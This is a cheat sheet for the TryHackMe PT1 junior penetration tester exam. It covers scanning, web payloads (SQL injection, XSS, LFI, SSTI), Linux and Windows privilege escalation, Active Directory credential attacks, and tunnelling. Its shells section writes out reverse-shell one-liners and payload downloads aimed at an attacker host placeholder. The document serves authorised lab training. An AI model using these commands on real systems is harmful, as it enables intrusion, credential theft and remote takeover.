# TryHackMe PT1 Cheat Sheet

*Junior Penetration Tester — exam prep & in-exam reference*

[Link](https://tryhackme.com/certification/junior-penetration-tester/details)

## 1. Exam logistics & scoring

PT1 is a **48-hour practical exam**: you connect to an internal network over OpenVPN and compromise machines across three domains, then submit **one professional report**. You get **one free retake**.

**Pass mark: 750 / 1000.** The report is graded (AI-assisted), so flags alone are not enough — a weak report fails even a full compromise.

Point split below is community-reported (not officially published), so treat it as a rough target, not gospel:

| Domain | Approx. points | What's there |
| --- | --- | --- |
| Network (NetSec) | \~360 | 1 Linux + 1 Windows host; service exploitation → privesc |
| Active Directory | \~240 | 2 Windows hosts; enumerate + abuse initial user's rights |
| Web / AppSec | \~400 | 1 web app, 4 flags/findings mapped to OWASP Top 10 |

**Non-negotiables:**

- Each point earned = **flag + a written finding** (CVSS score + exploitation steps). An unwritten flag often scores little.
- Document *as you go* — screenshots, commands, IPs. Don't leave the report to hour 47.
- Internet/notes are allowed; this is open-book. Your own cheat sheet is fair game.

## 2. Methodology (the loop)

Run the same loop on every host. Never jump to exploitation before enumeration is exhausted.

1. **Recon** — full port scan, then service/version scan on open ports.
2. **Enumerate** — dig into each service (web dirs, SMB shares, versions, default creds).
3. **Exploit** — get a foothold (known CVE, weak cred, web vuln, misconfig).
4. **Stabilise** — upgrade to a proper shell, note the user you landed as.
5. **Loot** — config files, creds, hashes, history, SSH keys, flags.
6. **Privesc** — local enum → escalate to root/SYSTEM/Domain Admin.
7. **Document** — screenshot the flag + the proof-of-exploit *immediately*.

**48-hour time plan (guideline):**

| Block | Focus |
| --- | --- |
| Hour 0–2 | VPN up, scan all targets, map the network |
| Hour 2–20 | Web + Network domains (most points) |
| Hour 20–36 | Active Directory chain |
| Hour 36–46 | Write/polish the report |
| Hour 46–48 | Buffer — re-check flag format, CVSS scores, screenshots |

**Rules of thumb:**

- Stuck >45 min on one box → switch domains, come back fresh.
- Keep a running `notes.md`: `IP | service | finding | cred | flag`.
- Re-scan after getting creds — new access often opens new ports/shares.

## 3. Recon & enumeration

**Nmap**

```bash
export IP=10.10.x.x
# Fast full-port sweep with RustScan (all 65535 ports, quick),
# then auto-pipes open ports into nmap for scripts + versions
rustscan -a $IP -- -sC -sV -oN services.txt
# Pure-nmap fallback if rustscan isn't installed:
nmap -p- --min-rate 5000 -T4 $IP -oN ports.txt
nmap -sC -sV -p <open-ports> $IP -oN services.txt
# UDP top ports (slow; run in background)
nmap -sU --top-ports 50 $IP
```

**Web (80/443/8080)**

```bash
whatweb http://$IP            # tech stack
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# Virtual hosts (if a domain is hinted)
ffuf -u http://$IP -H "Host: FUZZ.target.thm" -w subdomains.txt -fs <size>
nikto -h http://$IP
```

Always check `/robots.txt`, page source, JS files, and `/api` endpoints manually.

**SMB (139/445)**

```bash
enum4linux -a $IP
smbclient -L //$IP/ -N            # list shares, null session
smbmap -H $IP                    # show read/write perms
smbclient //$IP/share -N          # connect, then: get <file>
```

**Other common services**

```bash
# FTP 21 — try anonymous
ftp $IP        # user: anonymous  pass: anything
# DNS 53 — zone transfer
dig axfr @$IP target.thm
# SNMP 161
snmpwalk -v2c -c public $IP
# RPC 135/139
rpcclient -U "" -N $IP        # then: enumdomusers, querydispinfo
# LDAP 389
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

## 4. Web / AppSec (OWASP Top 10)

Reviewers agree this is the hardest domain: automation helps little, **Burp Suite is your main tool**, and you must read every response carefully (especially APIs). Map each finding to an OWASP category and give it a CVSS score.

**Burp workflow:** set Burp proxy → browse the whole app → map every parameter → send interesting requests to Repeater → fuzz with Intruder. Watch for IDs, tokens, hidden fields, and verbose errors.

| Vuln | Quick test | Exploit direction |
| --- | --- | --- |
| SQL injection | `'`, `' OR 1=1-- -`, `'`+timing | `sqlmap -r req.txt --batch --dump`; UNION to read tables |
| XSS | `<script>alert(1)</script>` in every field | Reflected/stored; steal cookies/session |
| IDOR / broken access | change `id=1` → `id=2`, swap user IDs | Access other users' data/functions |
| Auth bypass | default creds, weak JWT, `admin'-- -` | Forge/alter JWT (`jwt_tool`), role tampering |
| LFI | `?file=../../../../etc/passwd` | Read source/configs; log poisoning → RCE |
| Command injection | `; id`, \` | id` ,  `$(id)\`, backticks |
| File upload | upload `.php` / double-ext / null byte | Web shell → RCE |
| SSTI | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | Returns 49 → template RCE |
| XXE | inject `<!ENTITY>` in XML body | Read local files |
| SSRF | point URL param at `127.0.0.1`/metadata | Hit internal services |

**Key commands**

```bash
sqlmap -r request.txt --batch --level=5 --risk=3 --dump
jwt_tool <token> -T                     # tamper JWT
ffuf -u http://$IP/FUZZ -w wordlist -fc 404   # content discovery
# LFI → PHP wrapper source read
curl "http://$IP/?page=php://filter/convert.base64-encode/resource=index"
```

**API tip:** enumerate endpoints, test each HTTP method (GET/POST/PUT/DELETE), check for missing authorization per object — that is where several Web flags usually hide.

## 5. Network exploitation

Once you have a service + version, check for a known exploit before brute-forcing.

```bash
# Local exploit DB search
searchsploit <service> <version>
searchsploit -m <id>            # copy exploit locally

# Metasploit (use sparingly; manual is often faster)
msfconsole -q
search <service>
use <module>; set RHOSTS $IP; set LHOST <vpn-ip>; run
```

**Brute forcing (when creds are the way in)**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P pass.txt ftp://$IP
hydra -l user -P rockyou.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

**Common high-value vectors**

- Outdated **Apache/nginx/IIS**, **vsftpd**, **Samba**, **Jenkins**, **Tomcat** (default `tomcat:tomcat` → WAR upload), **phpMyAdmin**, **Webmin**.
- Anonymous FTP / null SMB session leaking creds or source.
- Reused credentials — a password found on one host usually works on another.

After a foothold, go straight to the privesc sections below.

## 6. Linux privilege escalation

```bash
# Automated enum (transfer first, see section 10)
./linpeas.sh | tee linpeas.out

# Manual quick wins
sudo -l                         # misconfigured sudo → GTFOBins
id; groups
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null          # capabilities
crontab -l; cat /etc/crontab     # cron jobs running as root
cat /etc/passwd; ls -la /home/*  # users, readable homes
history; cat ~/.bash_history
ls -la /opt /var/www /tmp        # custom scripts, creds
uname -a                         # kernel → searchsploit
```

**Escalation paths (fastest first):**

- **sudo -l** → check each allowed binary on [GTFOBins](https://gtfobins.github.io/).
- **SUID** binary → GTFOBins SUID section (e.g. `find`, `nmap`, `vim`, `bash`).
- **Writable cron / script** run by root → inject a reverse shell or `chmod +s /bin/bash`.
- **PATH hijack** — SUID binary calls a relative command; put a malicious one earlier in `$PATH`.
- **Capabilities** — `cap_setuid` on python/perl → spawn root shell.
- **Readable creds** — configs, `.env`, DB passwords, SSH keys in homes.
- **Kernel exploit** — last resort (DirtyPipe/DirtyCow etc.); can crash the box.

```bash
# GTFOBins SUID bash example
./bash -p            # if bash is SUID → -p keeps euid root
# sudo example
sudo find . -exec /bin/sh \; -quit
# capability setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 7. Windows privilege escalation

```powershell
# Automated
.\winPEASx64.exe
# Manual quick checks
whoami /priv                 # look for SeImpersonate, SeBackup, etc.
whoami /groups
systeminfo                   # OS build → exploit suggester
net user; net localgroup administrators
```

**Escalation paths:**

- **Token privileges** — `SeImpersonatePrivilege` → **Potato** attack (`PrintSpoofer`, `GodPotato`, `JuicyPotato`) → SYSTEM. Very common on service accounts.
- **Unquoted service paths** — `wmic service get name,pathname` → path with spaces + writable folder → plant exe.
- **Weak service perms** — `accesschk.exe -uwcqv user *` → reconfigure `binpath`.
- **AlwaysInstallElevated** — both registry keys = 1 → malicious `.msi` runs as SYSTEM.
- **Stored creds** — `cmdkey /list`, registry `winlogon`, unattended install files, `*.config`.
- **Saved sessions** — PuTTY/WinSCP registry, powershell history.

```cmd
:: PrintSpoofer (SeImpersonate)
PrintSpoofer.exe -i -c cmd
:: Unquoted path discovery
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """"
:: Search files for passwords
findstr /si password *.txt *.ini *.config *.xml
reg query HKLM /f password /t REG_SZ /s
```

Exploit suggester: paste `systeminfo` into **Windows-Exploit-Suggester** or run `Sherlock`/`watson`.

## 8. Active Directory

Two Windows hosts. Reviewers note you often **don't need deep pivoting** — correctly abusing the *initial user's* rights is usually enough. Get one credential, then enumerate everything that credential can see.

**Enumeration (with a valid user/pass)**

```bash
# BloodHound data collection
bloodhound-python -u user -p 'pass' -d domain.thm -ns $IP -c all
# Then import the .json into BloodHound GUI, mark owned, find paths to DA

# netexec (crackmapexec successor) — the AD swiss army knife
netexec smb $IP -u user -p 'pass' --shares
netexec smb $IP -u user -p 'pass' --users
netexec smb <subnet>/24 -u user -p 'pass'   # password spray / reuse

ldapsearch -x -H ldap://$IP -D 'user@domain.thm' -w 'pass' -b 'dc=domain,dc=thm'
rpcclient -U 'user%pass' $IP    # enumdomusers, querygroupmem
```

**Credential attacks**

```bash
# AS-REP roast (users w/o pre-auth) — no creds needed for the list
impacket-GetNPUsers domain.thm/ -usersfile users.txt -no-pass -dc-ip $IP
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberoast (needs any valid cred) — crack service accounts
impacket-GetUserSPNs domain.thm/user:pass -dc-ip $IP -request
hashcat -m 13100 kerb.hash rockyou.txt
```

**Move with a hash or cred (no cracking needed)**

```bash
# Pass-the-Hash
impacket-psexec -hashes :<NTLM> administrator@$IP
netexec smb $IP -u admin -H <NTLM>
evil-winrm -i $IP -u user -p 'pass'          # if WinRM (5985) open
evil-winrm -i $IP -u user -H <NTLM>
```

**Dump the domain once you're admin**

```bash
impacket-secretsdump domain.thm/admin:pass@$IP        # all hashes
impacket-secretsdump -hashes :<NTLM> admin@<DC-IP>
```

**Chain:** low user → roast/spray → better cred → BloodHound path → DC. Check ACLs (GenericAll/WriteDACL), DCSync rights, and group memberships.

## 9. Pivoting & tunnelling

When a second host is only reachable *through* the first, tunnel into the internal subnet.

**Chisel (most reliable)**

```bash
# On your attack box (server)
./chisel server -p 8000 --reverse
# On the compromised host (client) — SOCKS proxy back to you
./chisel client <your-vpn-ip>:8000 R:socks
# Then route tools through it
proxychains nmap -sT -Pn <internal-ip>
```

**Ligolo-ng (cleaner for AD)**

```bash
# Attacker: start proxy, add a tun interface + route to internal subnet
./proxy -selfcert
ip route add 10.10.20.0/24 dev ligolo
# Victim
./agent -connect <your-vpn-ip>:11601 -ignore-cert
```

**SSH port forwarding (if you have SSH)**

```bash
ssh -L 8080:127.0.0.1:80 user@$IP        # local forward
ssh -D 1080 user@$IP                     # dynamic SOCKS → proxychains
sshuttle -r user@$IP 10.10.20.0/24       # VPN-like, no proxychains
```

Set `socks5 127.0.0.1 1080` (or 9050) in `/etc/proxychains4.conf`, then prefix tools with `proxychains`.

## 10. Shells & file transfer

**Listener**

```bash
rlwrap nc -lvnp 4444        # rlwrap gives arrow-key history
```

**Reverse shells** — generate at [revshells.com](https://revshells.com/) or:

```bash
bash -i >& /dev/tcp/<ip>/4444 0>&1
nc <ip> 4444 -e /bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
# Windows (PowerShell one-liner from revshells.com) — use base64 if needed
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o s.exe
```

**Stabilise a Linux shell**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl+Z
stty raw -echo; fg        # on your box
export TERM=xterm         # back in the shell
```

**File transfer**

```bash
# Attacker serves
python3 -m http.server 80
impacket-smbserver share . -smb2support     # for Windows

# Linux target pulls
wget http://<ip>/linpeas.sh -O /tmp/lp.sh
curl http://<ip>/file -o file

# Windows target pulls
certutil -urlcache -f http://<ip>/winPEAS.exe wp.exe
powershell iwr http://<ip>/file -OutFile file
copy \\<ip>\share\file.exe file.exe
```

## 11. Credentials & hash cracking

```bash
# Identify a hash
hashid '<hash>'    # or paste into hashcat --example-hashes

# Crack
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt hash.txt
john --format=<fmt> hash.txt
```

**Common hashcat modes**

| Mode | Hash type |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt (`$6$` /etc/shadow) |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP roast |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |

**Format converters**

```bash
unshadow /etc/passwd /etc/shadow > crack.txt   # Linux shadow
ssh2john id_rsa > key.hash                      # SSH private key
zip2john file.zip > zip.hash                     # protected zip
```

Always try harvested passwords **everywhere** (SSH, SMB, WinRM, web logins, other users) before cracking — reuse beats brute force.

## 12. Report writing (don't lose here)

The report is graded and **can fail you even with every flag**. Reviewers have scored \~765/1000 with 9/10 flags purely because the report dragged. Write it *as you exploit*, not after.

**Required structure**

1. **Executive summary** — plain-English overview for non-technical readers: what you tested, overall risk posture, headline findings. No jargon.
2. **Scope & methodology** — targets, approach, tools, the frameworks used (OWASP, etc.).
3. **Findings** — one entry per vulnerability, each with:
   - Title + affected host/endpoint
   - **CVSS v3.1 score + vector** and severity rating
   - Description — what the flaw is
   - **Steps to reproduce** — exact commands + screenshots (the proof)
   - Impact — what an attacker gains
   - **Remediation** — concrete, actionable fix
4. **Conclusion** — overall summary and recommendations.

**CVSS:** score every finding at [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator). Rough anchors: RCE/full compromise = Critical (9.0+); SQLi/auth bypass = High; stored XSS/IDOR = Medium–High; info leak = Low–Medium. Justify the vector briefly.

**Scoring well (AI-graded):**

- Follow THM's recommended structure *closely* — the grader rewards expected sections.
- Every flag needs a matching written finding; a submitted flag with no write-up often earns little.
- One clear screenshot per step: command run + output/flag visible.
- Clear remediation per finding — don't skip it, it carries marks.
- Be precise and complete over verbose. Map findings to OWASP categories where relevant.

**Capture discipline during the exam:** for every finding save the IP, the exact command, the response/flag screenshot, and the CVSS vector into `notes.md` immediately. Assembling the report is then copy-paste, not archaeology at hour 47.

## 13. Recommended prep rooms

THM rooms mapped to each domain (community-suggested PT1 practice):

| Domain | Rooms |
| --- | --- |
| Web / AppSec | [rabbitstore](https://tryhackme.com/room/rabbitstore), [resetui](https://tryhackme.com/room/resetui), [ledger](https://tryhackme.com/room/ledger), [stealth](https://tryhackme.com/room/stealth), [lookback](https://tryhackme.com/room/lookback) |
| Privesc + Network | [linprivesc](https://tryhackme.com/room/linprivesc), [windowsprivesc20](https://tryhackme.com/room/windowsprivesc20), [netsecchallenge](https://tryhackme.com/room/netsecchallenge) |
| Active Directory | [adbasicenumeration](https://tryhackme.com/room/adbasicenumeration), [adauthenticatedenumeration](https://tryhackme.com/room/adauthenticatedenumeration), [lateralmovementandpivoting](https://tryhackme.com/room/lateralmovementandpivoting) |
| Reporting | [writingpentestreports](https://tryhackme.com/room/writingpentestreports) |

The full **Jr Penetration Tester** and **Offensive Pentesting** learning paths cover everything above in order.

---

### Sources

- [PT1 certification page — TryHackMe](https://tryhackme.com/certification/junior-penetration-tester) (48h, €301, 1 retake, 3 domains + report)
- [HackerDNA — PT1 format & 750/1000 pass mark](https://hackerdna.com/blog/certifications-tryhackme)
- [Exam experience write-up — point split & prep rooms](https://viblo.asia/p/chia-se-kinh-nghiem-thi-junior-penetration-tester-pt1-certification-tryhackme-1XVOWgx8VMz)
- [dragkob — PT1 review (exam component breakdown)](https://dragkob.notion.site/pt1-review-dragkob)
